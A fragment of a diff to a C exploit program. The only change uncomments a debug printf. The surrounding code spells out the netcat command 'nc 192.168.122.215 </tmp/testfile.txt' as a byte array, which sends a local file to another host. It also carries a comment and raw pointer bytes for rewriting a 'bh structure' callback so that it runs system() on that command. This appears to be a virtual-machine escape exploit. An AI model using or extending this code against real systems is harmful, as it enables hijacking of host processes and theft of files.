@@ -14,7 +14,7 @@
 int main(void){
         unsigned char code[] = {'n','c',' ','1','9','2','.','1','6','8','.','1','2','2','.','2','1','5',' ','<','/','t','m','p','/','t','e','s','t','f','i','l','e','.','t','x','t', '\0'};  //this can be a input of the function
         int len_of_command = sizeof(code)/(sizeof(char));
-        // printf("len = %d\n", len_of_command);
+        printf("len = %d\n", len_of_command);
     
          //rewrite bh structure to point to "system", where cb is system, opaque is the string address
         char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
